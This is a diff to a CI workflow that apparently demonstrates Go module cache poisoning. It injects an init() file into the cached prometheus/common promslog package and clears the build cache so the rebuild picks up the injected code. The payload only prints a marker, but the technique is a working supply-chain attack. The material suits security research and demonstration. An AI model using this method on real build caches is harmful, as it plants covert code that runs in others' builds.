@@ -36,7 +36,7 @@ jobs:
           echo "=== Running clean binary ==="
           ./victim_clean
 
-      - name: "Step 3: Poison the cached module (our payload)"
+      - name: "Step 3: Poison the cached module AND invalidate build cache"
         run: |
           pkgdir=$(find ~/go/pkg/mod -not -path "*/cache/*" -type d -path "*/prometheus/common*" 2>/dev/null | grep promslog | head -1)
           if [ -z "$pkgdir" ]; then
@@ -50,6 +50,8 @@ jobs:
           printf 'package %s\n\nimport "fmt"\n\nfunc init() {\n\tfmt.Println("EACTION BACKDOOR EXECUTED")\n}\n' "$pkgname" > "$pkgdir/eaction_cache_init.go"
           echo "=== Injected file ==="
           cat "$pkgdir/eaction_cache_init.go"
+          echo "=== Clearing Go build cache so next build recompiles from poisoned source ==="
+          go clean -cache
 
       - name: "Step 4: Rebuild from poisoned cache"
         run: |
